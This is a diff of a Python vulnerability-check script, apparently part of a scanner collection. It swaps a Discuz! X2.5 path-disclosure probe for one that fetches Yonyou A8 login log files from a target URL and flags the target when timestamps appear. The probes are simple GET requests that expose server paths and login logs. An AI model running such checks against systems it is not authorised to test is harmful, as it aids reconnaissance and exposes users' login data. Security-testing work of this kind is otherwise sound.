@@ -1,18 +1,18 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: discuz! X2.5 物理路径泄露漏洞
-referer: http://www.uedbox.com/discuzx25-explosive-path/
+name: 用友a8 log泄露
+referer: http://wooyun.tangscan.cn/static/bugs/wooyun-2014-081757.html
 author: Lucifer
-description: 报错导致路径泄露。
+description: 用友a8 logs目录中多个log文件可访问。
 '''
-import re
 import sys
+import re
 import requests
 import warnings
 from termcolor import cprint
 
-class discuz_x25_path_disclosure_BaseVerify:
+class yonyou_a8_logs_disclosure_BaseVerify:
     def __init__(self, url):
         self.url = url
 
@@ -20,21 +20,20 @@ class discuz_x25_path_disclosure_BaseVerify:
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
-        payloads = ["/uc_server/control/admin/db.php",
-                    "/source/plugin/myrepeats/table/table_myrepeats.php",
-                    "/install/include/install_lang.php"]
+        payloads = ["/logs/login.log", 
+                    "/seeyon/logs/login.log"]
         try:
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-                pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
+                pattern = re.search("[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", req.text)
                 if pattern:
-                    cprint("[+]存在Discuz! X2.5 物理路径泄露漏洞...(低危)\tpayload: "+vulnurl+"\tGet物理路径: "+pattern.group(1), "green")
+                    cprint("[+]存在用友a8 log泄露漏洞...(低危)\tpayload: "+vulnurl, "green")
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = discuz_x25_path_disclosure_BaseVerify(sys.argv[1])
+    testVuln = yonyou_a8_logs_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
